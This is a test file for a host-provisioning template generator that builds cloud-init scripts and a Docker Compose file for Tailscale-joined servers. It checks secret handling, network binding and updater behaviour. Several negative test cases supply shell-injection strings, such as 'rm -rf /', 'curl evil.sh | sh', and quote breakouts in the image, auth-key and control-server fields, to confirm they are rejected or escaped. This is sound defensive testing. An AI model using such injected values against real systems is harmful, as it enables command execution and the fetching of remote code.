import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";

import {
  HOST_CONTROL_DIR,
  HOST_DIR,
  HOST_MARKER,
  HOST_UPDATE_LOG,
  HOST_UPDATE_REQUEST,
  initialSshUser,
  isValidImageRef,
  parseHostMarker,
  registryHost,
  renderHostCloudInit,
  renderHostCompose,
  HOST_WORKSPACE_DIR,
  safeHostName,
  type NexusHostSpec,
} from "./template-host";

const AUTH_KEY = "tskey-auth-SUPERSECRET-abc123";

const baseSpec = (over: Partial<NexusHostSpec> = {}): NexusHostSpec => ({
  name: "nexus-prod",
  imageRef: "ghcr.io/ideascoldigital/nexus:latest",
  tailscaleAuthKey: AUTH_KEY,
  pullEmbeddingModel: true,
  ...over,
});

// ---- host names ------------------------------------------------------------

// Executes generated shell in a real bash. On Windows `bash` resolves to
// C:\Windows\System32\bash.exe — the WSL launcher, not a shell: it re-parses
// argv and rewrites paths on the way into the distro, so the temp directories
// these assert against do not exist as written. The scripts under test only
// ever run on Linux instances.
const realBash = {
  skip:
    process.platform === "win32" &&
    "`bash` here is the WSL launcher, which re-parses argv",
};
test("safeHostName produces a DNS label", () => {
  assert.equal(safeHostName("Nexus Prod"), "nexus-prod");
  assert.equal(safeHostName("my_host!!"), "my-host");
  assert.equal(safeHostName("--lead-and-trail--"), "lead-and-trail");
  assert.equal(safeHostName(""), "nexus-host");
  assert.equal(safeHostName("!!!"), "nexus-host");
});

test("safeHostName caps at the 63-char DNS label limit without a trailing dash", () => {
  const long = safeHostName("a".repeat(80));
  assert.equal(long.length, 63);

  // Truncation must not leave a trailing hyphen â€” Tailscale derives the
  // MagicDNS name from this and would reject it.
  const awkward = safeHostName("a".repeat(62) + "-bbbb");
  assert.ok(!awkward.endsWith("-"), `ends with a hyphen: ${awkward}`);
  assert.ok(awkward.length <= 63);
});

// ---- image references ------------------------------------------------------

test("isValidImageRef accepts real references", () => {
  for (const ref of [
    "ghcr.io/ideascoldigital/nexus:latest",
    "ghcr.io/ideascoldigital/nexus:1.2.3",
    "nexus",
    "nexus:edge",
    "localhost:5000/nexus:dev",
    "ghcr.io/o/r@sha256:" + "a".repeat(64),
  ]) {
    assert.ok(isValidImageRef(ref), `should accept ${ref}`);
  }
});

test("isValidImageRef rejects anything that could escape the shell", () => {
  for (const ref of [
    "",
    "nexus; rm -rf /",
    "nexus && curl evil.sh | sh",
    "nexus$(whoami)",
    "nexus`id`",
    "nexus latest",
    "ghcr.io/o/r:tag'; echo pwned; '",
    "a".repeat(300),
  ]) {
    assert.ok(!isValidImageRef(ref), `should reject ${JSON.stringify(ref)}`);
  }
});

test("rendering refuses an invalid image reference outright", () => {
  assert.throws(
    () => renderHostCloudInit(baseSpec({ imageRef: "nexus; rm -rf /" })),
    /invalid image reference/,
  );
});

// ---- the auth key must never be readable in the log ------------------------

test("the tailscale auth key is written under `set +x`, not traced", () => {
  const script = renderHostCloudInit(baseSpec());

  const keyIndex = script.indexOf(AUTH_KEY);
  assert.ok(keyIndex > 0, "the key has to appear once â€” it is being installed");

  // Everything between the last `set +x` before the key and the key itself
  // must not re-enable tracing, or `set -x` would echo the key into the log
  // that this script tees to disk.
  const before = script.slice(0, keyIndex);
  const lastDisable = before.lastIndexOf("set +x");
  assert.ok(lastDisable > 0, "no `set +x` precedes the key");
  assert.ok(
    !before.slice(lastDisable).includes("set -x"),
    "tracing is re-enabled before the key is used",
  );
});

test("the key file is deleted, and only the key file carries it", () => {
  const script = renderHostCloudInit(baseSpec());
  assert.ok(script.includes(`rm -f ${HOST_DIR}/.tskey`));
  // Exactly one occurrence: the write. Anything else means it leaked into a
  // second command (an echo, an env file, a compose value).
  assert.equal(script.split(AUTH_KEY).length - 1, 1);
});

test("the key never reaches the .env file or the compose stack", () => {
  const script = renderHostCloudInit(baseSpec());
  const envBlock = script.slice(script.indexOf("NEXUS_ENV_EOF"));
  assert.ok(!envBlock.includes(AUTH_KEY));
  assert.ok(!renderHostCompose({ imageRef: "x" }).includes(AUTH_KEY));
});

test("a self-hosted control server goes on the host's tailscale up", () => {
  const script = renderHostCloudInit(
    // Trailing slash stripped: it must match the flag verbatim.
    baseSpec({ tailscaleLoginServer: "https://vpn.example.com/" }),
  );
  assert.ok(script.includes("--login-server='https://vpn.example.com'"));
  // The flag sits inside the same continued command as the key.
  assert.ok(script.includes("--authkey="));
  assert.ok(!renderHostCloudInit(baseSpec()).includes("--login-server"));
});

test("the control server does not push the key out of the untraced block", () => {
  // The flag is spliced in right after `--authkey`, which is the one place a
  // stray newline could end the command and leave the key echoed by `set -x`.
  const script = renderHostCloudInit(
    baseSpec({ tailscaleLoginServer: "https://vpn.example.com" }),
  );
  const keyIndex = script.indexOf(AUTH_KEY);
  const before = script.slice(0, keyIndex);
  const lastDisable = before.lastIndexOf("set +x");
  assert.ok(lastDisable > 0);
  assert.ok(!before.slice(lastDisable).includes("set -x"));
  assert.equal(script.split(AUTH_KEY).length - 1, 1);
  // Still one command: the join, not a join followed by loose arguments.
  assert.match(
    script,
    /tailscale up \\\n\s+--authkey="\$\(cat [^"]+\)" \\\n\s+--login-server='https:\/\/vpn\.example\.com' \\\n\s+--hostname=/,
  );
});

test("a quote in the control server cannot break out of the shell string", () => {
  const script = renderHostCloudInit(
    baseSpec({ tailscaleLoginServer: "https://x'; curl evil.sh | sh; '" }),
  );
  assert.ok(!script.includes("; curl evil.sh | sh; '\n"));
  assert.ok(script.includes(`'\\''`));
});

test("a host still renders without a control server, joining Tailscale's own", () => {
  // The field is optional on the spec; the common case must not gain a flag.
  const script = renderHostCloudInit(baseSpec({ tailscaleLoginServer: null }));
  assert.ok(!script.includes("--login-server"));
  assert.ok(script.includes("--authkey="));
});

test("a quote in the auth key cannot break out of the shell string", () => {
  const nasty = "tskey-auth-x'; curl evil.sh | sh; '";
  const script = renderHostCloudInit(baseSpec({ tailscaleAuthKey: nasty }));
  // shq escapes the quote rather than ending the literal.
  assert.ok(!script.includes("; curl evil.sh | sh; '\n"));
  assert.ok(script.includes(`'\\''`));
});

// ---- workspace -------------------------------------------------------------

// A host pulls its image and recreates the container on every update, so the
// only writable, surviving place for a checkout is a declared volume. Without
// one the app cloned into an image path it did not own and every repository
// failed with EACCES.
test("checkouts get a named volume, not a path in the image layer", () => {
  const compose = renderHostCompose({ imageRef: "ghcr.io/o/r:latest" });

  assert.ok(compose.includes(`- nexux-workspace:${HOST_WORKSPACE_DIR}`));
  // Declared at the top level too, or compose reads it as a bind mount of a
  // relative host path and the checkouts stop being persistent.
  assert.match(compose, /^volumes:$[\s\S]*^ {2}nexux-workspace:$/m);
  // The app cannot use what it is not told about.
  assert.ok(compose.includes(`NEXUX_WORKSPACE_ROOT: "${HOST_WORKSPACE_DIR}"`));
});

// ---- binding ---------------------------------------------------------------

test("the stack binds to the tailscale address, never 0.0.0.0", () => {
  const compose = renderHostCompose({ imageRef: "ghcr.io/o/r:latest" });
  assert.ok(compose.includes("${NEXUX_BIND}:3030:3030"));
  // The terminal WS is useless without its port published.
  assert.ok(compose.includes("${NEXUX_BIND}:3002:3002"));

  // Check the port mappings themselves rather than the whole file: the comment
  // above them explains the rule by naming 0.0.0.0, and a substring search
  // would match that prose instead of a real binding.
  const portLines = compose
    .split("\n")
    .filter((l) => /^\s+- ".*:\d+:\d+"/.test(l));
  assert.ok(portLines.length > 0, "no port mappings found");
  for (const line of portLines) {
    assert.ok(
      line.includes("${NEXUX_BIND}"),
      `port mapping does not bind to NEXUX_BIND: ${line.trim()}`,
    );
    assert.ok(!line.includes("0.0.0.0"), `binds publicly: ${line.trim()}`);
  }
});

test("no tailscale address is a fatal error, not a fallback bind", () => {
  const script = renderHostCloudInit(baseSpec());
  const idx = script.indexOf("no tailscale IPv4");
  assert.ok(idx > 0, "missing the no-address guard");
  // It must exit rather than continue: continuing would bind an app with no
  // authentication to a public interface (D-34).
  assert.match(script.slice(idx, idx + 400), /exit 1/);
});

test("a failed tailscale join aborts before the stack starts", () => {
  const script = renderHostCloudInit(baseSpec());
  const joinFail = script.indexOf("tailscale up failed");
  const composeUp = script.indexOf("compose -f " + HOST_DIR + "/docker-compose.yml up -d");
  assert.ok(joinFail > 0 && composeUp > 0);
  assert.ok(joinFail < composeUp, "the join guard must precede `up -d`");
});

// ---- ordering --------------------------------------------------------------

test("the compose file is written before the stack is started", () => {
  const script = renderHostCloudInit(baseSpec());
  const write = script.indexOf("NEXUS_COMPOSE_EOF");
  const up = script.indexOf("up -d");
  assert.ok(write > 0 && up > 0 && write < up);
});

test("the marker is written last and records the resolved address", () => {
  const script = renderHostCloudInit(baseSpec());
  const marker = script.indexOf(`> ${HOST_MARKER}`);
  const up = script.indexOf("up -d");
  assert.ok(marker > up, "the marker must not precede a working stack");
  assert.ok(script.includes("tailscale_ip=%s"));
  // Nothing but the trailing echo may follow it â€” the panel treats the marker
  // as "done", so work after it would be invisible.
  assert.ok(script.slice(marker).split("\n").length < 6);
});

test("the embedding model is optional and non-fatal", () => {
  const withModel = renderHostCloudInit(baseSpec({ pullEmbeddingModel: true }));
  assert.ok(withModel.includes("nomic-embed-text"));
  // A pull failure must not sink an otherwise working host.
  assert.match(withModel, /nomic-embed-text[\s\S]{0,200}\|\|/);

  const without = renderHostCloudInit(baseSpec({ pullEmbeddingModel: false }));
  assert.ok(!without.includes("nomic-embed-text"));
});

test("a failed image pull is fatal and says why", () => {
  const script = renderHostCloudInit(baseSpec());
  const idx = script.indexOf("could not pull");
  assert.ok(idx > 0);
  assert.match(script.slice(idx, idx + 300), /public|credentials/);
  assert.match(script.slice(idx, idx + 300), /exit 1/);
});

// ---- registry --------------------------------------------------------------

test("registry credentials are optional and untraced when present", () => {
  const none = renderHostCloudInit(baseSpec());
  assert.ok(!none.includes("docker login"));

  const withReg = renderHostCloudInit(
    baseSpec({ registry: { username: "bot", password: "ghp_secret123" } }),
  );
  assert.ok(withReg.includes("docker login"));
  // Every occurrence of the token sits inside a set +x window: the .env
  // append and the docker login.
  let at = withReg.indexOf("ghp_secret123");
  while (at !== -1) {
    const disable = withReg.lastIndexOf("set +x", at);
    assert.ok(
      disable > 0 && !withReg.slice(disable, at).includes("set -x"),
      `token at ${at} is outside a set +x window`,
    );
    at = withReg.indexOf("ghp_secret123", at + 1);
  }
});

test("the registry token reaches the app's env for the update check", () => {
  const withReg = renderHostCloudInit(
    baseSpec({ registry: { username: "bot", password: "ghp_secret123" } }),
  );
  assert.ok(withReg.includes("printf 'GITHUB_TOKEN=%s\\n'"));

  // Without registry credentials nothing writes GITHUB_TOKEN at all.
  assert.ok(!renderHostCloudInit(baseSpec()).includes("GITHUB_TOKEN"));
});

// ---- SSH user and registry -------------------------------------------------

test("AWS is reached as ubuntu, not root", () => {
  // Ubuntu AMIs pre-seed /root/.ssh/authorized_keys with a
  // command="Please login as the user \"ubuntu\"" entry, so a root connection
  // is refused â€” and the monitor connects while cloud-init is still running,
  // before the bootstrap has rewritten that file.
  assert.equal(initialSshUser("aws"), "ubuntu");
  assert.equal(initialSshUser("civo"), "root");
});

test("the bootstrap re-authorizes the key for root", () => {
  const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 test@nexus";
  const script = renderHostCloudInit(baseSpec({ authorizedKeys: [key] }));
  assert.ok(script.includes(key));
  // OVERWRITE, not append: sshd uses the first matching entry, so an appended
  // clean copy would never be reached past the AMI's "login as ubuntu" line.
  assert.match(script, />\s*\/root\/\.ssh\/authorized_keys/);
  assert.ok(!script.includes(">> /root/.ssh/authorized_keys"));
});

test("no keys means no authorization block at all", () => {
  const script = renderHostCloudInit(baseSpec());
  assert.ok(!script.includes("authorized_keys"));
});

test("registryHost resolves what docker login should target", () => {
  assert.equal(registryHost("ghcr.io/ideascoldigital/nexus:latest"), "ghcr.io");
  assert.equal(registryHost("localhost:5000/nexus:dev"), "localhost:5000");
  // No registry component: Docker Hub. The colon here is the tag, not a port â€”
  // treating "nexus:edge" as a host would send docker at a machine by that name.
  assert.equal(registryHost("nexus:edge"), "docker.io");
  assert.equal(registryHost("nexus"), "docker.io");
  assert.equal(registryHost("library/nexus"), "docker.io");
});

test("registry login targets the right host and survives failure", () => {
  const script = renderHostCloudInit(
    baseSpec({ registry: { username: "bot", password: "ghp_x" } }),
  );
  assert.match(script, /docker login 'ghcr\.io'/);
  // A failed login must not abort: the pull immediately after reports the
  // actual reason, which is more useful than dying here.
  assert.match(script, /registry login failed/);
});

// ---- EC2 user_data budget --------------------------------------------------

test("the script fits well inside EC2's 16KB user_data limit", () => {
  // prepareWorkDir throws above this; a host bootstrap must never be the thing
  // that trips it, so assert rather than assume.
  const bytes = Buffer.byteLength(
    renderHostCloudInit(
      baseSpec({
        registry: { username: "bot", password: "x".repeat(80) },
        setupScript: "echo hello\n".repeat(20),
      }),
    ),
    "utf8",
  );
  assert.ok(bytes < 16 * 1024, `bootstrap is ${bytes} bytes`);
});

// ---- marker parsing --------------------------------------------------------

test("parseHostMarker reads the address back", () => {
  assert.deepEqual(
    parseHostMarker("tailscale_ip=100.64.1.5\nimage=ghcr.io/o/r:latest\n"),
    { tailscaleIp: "100.64.1.5", imageRef: "ghcr.io/o/r:latest" },
  );
});

test("parseHostMarker returns null while the bootstrap is unfinished", () => {
  // An absent or partial marker means "keep polling", never "failed".
  assert.equal(parseHostMarker(""), null);
  assert.equal(parseHostMarker("image=x\n"), null);
  assert.deepEqual(parseHostMarker("tailscale_ip=100.64.1.5\n"), {
    tailscaleIp: "100.64.1.5",
    imageRef: null,
  });
});

// ---- self-update -----------------------------------------------------------

test("the app gets a control directory, never the docker socket", () => {
  // Mounting /var/run/docker.sock is root-equivalent on the host, and the app
  // has no authentication (D-34). A directory it can drop a request into is
  // the whole capability: it can ask to be updated and nothing else.
  const compose = renderHostCompose({ imageRef: "ghcr.io/o/r:edge" });
  assert.ok(compose.includes(`${HOST_CONTROL_DIR}:/host-control`));
  assert.ok(!compose.includes("docker.sock"));
});

test("the updater keeps the volumes that hold the data", () => {
  // `down -v` here would delete the database, the saved credentials and the
  // search indexes â€” everything the update exists to preserve.
  const script = renderHostCloudInit(baseSpec());
  const updater = script.slice(
    script.indexOf("cat > " + HOST_DIR + "/update.sh"),
    script.indexOf("NEXUS_UPDATE_EOF\nchmod 755"),
  );
  assert.ok(updater.includes("docker compose pull"));
  assert.ok(updater.includes("docker compose up -d"));
  // Commands only â€” the comment above them explains why `down` is absent, and
  // matching raw text would just assert on prose.
  const commands = updater
    .split("\n")
    .filter((l) => l.trim() && !l.trim().startsWith("#"));
  assert.ok(!commands.some((l) => /docker compose\s+down/.test(l)));
});

test("the update request is consumed by the run it triggers", () => {
  // The path unit fires on the file existing, so an updater that left it in
  // place would re-trigger itself for as long as it was there.
  const script = renderHostCloudInit(baseSpec());
  const updater = script.slice(script.indexOf(`cat > ${HOST_DIR}/update.sh`));
  const removal = updater.indexOf(`rm -f ${HOST_UPDATE_REQUEST}`);
  const pull = updater.indexOf("docker compose pull");
  assert.ok(removal > 0, "the request file is never removed");
  assert.ok(removal < pull, "the request must be consumed before the pull");
});

test("a request left from before a reboot does not update the host on boot", () => {
  // cloud-init re-runs, and the path unit is armed at the end of it: a stale
  // request would start an update nobody asked for.
  const script = renderHostCloudInit(baseSpec());
  const removal = script.lastIndexOf(`rm -f ${HOST_UPDATE_REQUEST}`);
  const enable = script.indexOf("systemctl enable --now nexus-update.path");
  assert.ok(removal > 0 && enable > 0);
  assert.ok(removal < enable, "the stale request outlives the unit being armed");
});

test("the updater writes somewhere the app can read it back", () => {
  // The self-update path never sees the command's output â€” the container
  // running it is replaced mid-pull â€” so the log is the only record.
  const script = renderHostCloudInit(baseSpec());
  assert.ok(script.includes(`exec >> ${HOST_UPDATE_LOG}`));
  assert.ok(HOST_UPDATE_LOG.startsWith(HOST_CONTROL_DIR));
});

test("the generated updater actually runs, logs, and consumes its trigger", realBash, async () => {
  // Executed rather than pattern-matched: the earlier tests assert the script
  // *says* the right things, and this one asserts it does them. `docker` is a
  // stub on PATH, so nothing is pulled and the assertions are about the
  // script's own behaviour â€” the trigger file being consumed and the log being
  // written are what the systemd path unit and the UI depend on.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-update-"));
  try {
    const control = path.join(dir, "control");
    fs.mkdirSync(control);

    const script = renderHostCloudInit(baseSpec());
    const body = script.slice(
      script.indexOf("#!/bin/bash\n# Pull the published image"),
      script.indexOf("NEXUS_UPDATE_EOF\nchmod 755"),
    );
    // Retarget the absolute host paths at the temp directory.
    const local = body
      .split(HOST_CONTROL_DIR)
      .join(control)
      .split(HOST_DIR)
      .join(dir);
    const updater = path.join(dir, "update.sh");
    fs.writeFileSync(updater, local, { mode: 0o755 });

    const bin = path.join(dir, "bin");
    fs.mkdirSync(bin);
    fs.writeFileSync(
      path.join(bin, "docker"),
      '#!/bin/bash\necho "docker $*"\n',
      { mode: 0o755 },
    );

    const request = path.join(control, "update-requested");
    fs.writeFileSync(request, "now");

    await new Promise<void>((resolve, reject) => {
      const child = spawn("bash", [updater], {
        env: { ...process.env, PATH: `${bin}:${process.env.PATH}` },
      });
      child.on("error", reject);
      child.on("close", () => resolve());
    });

    assert.ok(!fs.existsSync(request), "the trigger file must be consumed");
    const log = fs.readFileSync(path.join(control, "update.log"), "utf8");
    assert.match(log, /\[nexus-update\] started/);
    assert.match(log, /docker compose pull/);
    assert.match(log, /docker compose up -d/);
    assert.match(log, /\[nexus-update\] finished/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("the updater reclaims space before it pulls", () => {
  // Nothing else on the host collects superseded images, and a host that has
  // updated a dozen times fills its disk and dies mid-extract on the next pull.
  const script = renderHostCloudInit(baseSpec());
  const updater = script.slice(
    script.indexOf(`cat > ${HOST_DIR}/update.sh`),
    script.indexOf("NEXUS_UPDATE_EOF\nchmod 755"),
  );
  const prune = updater.indexOf("docker image prune -f");
  const pull = updater.indexOf("docker compose pull");
  assert.ok(prune > 0, "superseded images are never collected");
  assert.ok(prune < pull, "the prune must precede the pull it makes room for");
  // Commands only: the failure branch *prints* `prune -af` as advice for an
  // operator, and matching raw text would read that suggestion as a command.
  const commands = updater
    .split("\n")
    .filter((l) => l.trim() && !l.trim().startsWith("#") && !/^\s*echo /.test(l));
  // `-a` would drop the image the running stack was started from, and `-f`
  // alone keeps anything a container still references.
  assert.ok(!commands.some((l) => /docker image prune\s+-a/.test(l)));
  // Volumes carry the database, the credentials and the search indexes.
  assert.ok(!commands.some((l) => /prune[^\n]*--volumes/.test(l)));
});

test(
  "a pull that fails on a full disk says so instead of blaming the registry",
  realBash,
  async () => {
    // The operator only ever sees this log. Reporting "check the registry
    // credentials" at a host whose real problem is 204MB of free disk sends
    // them to rotate a token that was never wrong.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-update-full-"));
    try {
      const control = path.join(dir, "control");
      fs.mkdirSync(control);

      const script = renderHostCloudInit(baseSpec());
      const body = script.slice(
        script.indexOf("#!/bin/bash\n# Pull the published image"),
        script.indexOf("NEXUS_UPDATE_EOF\nchmod 755"),
      );
      const local = body
        .split(HOST_CONTROL_DIR)
        .join(control)
        .split(HOST_DIR)
        .join(dir);
      const updater = path.join(dir, "update.sh");
      fs.writeFileSync(updater, local, { mode: 0o755 });

      const bin = path.join(dir, "bin");
      fs.mkdirSync(bin);
      // A pull that fails the way a full disk fails it, and a `df` reporting
      // the disk that caused it.
      fs.writeFileSync(
        path.join(bin, "docker"),
        '#!/bin/bash\nif [ "$2" = "pull" ]; then\n' +
          '  echo "no space left on device" >&2\n  exit 1\nfi\n' +
          'echo "docker $*"\n',
        { mode: 0o755 },
      );
      fs.writeFileSync(
        path.join(bin, "df"),
        '#!/bin/bash\nif [ "$1" = "--output=avail" ]; then\n' +
          '  printf "Avail\\n204800\\n"\nelse\n' +
          '  printf "Filesystem Size Used Avail Use%% Mounted\\n/dev/root 39G 39G 204M 100%% /\\n"\nfi\n',
        { mode: 0o755 },
      );

      fs.writeFileSync(path.join(control, "update-requested"), "now");

      const code = await new Promise<number>((resolve, reject) => {
        const child = spawn("bash", [updater], {
          env: { ...process.env, PATH: `${bin}:${process.env.PATH}` },
        });
        child.on("error", reject);
        child.on("close", (c) => resolve(c ?? 0));
      });

      assert.equal(code, 1, "a failed pull must fail the run");
      const log = fs.readFileSync(path.join(control, "update.log"), "utf8");
      assert.match(log, /the disk is full/);
      assert.doesNotMatch(log, /registry credentials/);
      assert.match(log, /\[nexus-update\] finished/);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
);

// ---- custom setup ----------------------------------------------------------

test("a custom setup script runs before the marker", () => {
  const script = renderHostCloudInit(
    baseSpec({ setupScript: "echo custom-step" }),
  );
  const custom = script.indexOf("echo custom-step");
  const marker = script.indexOf(`> ${HOST_MARKER}`);
  assert.ok(custom > 0 && custom < marker);
});
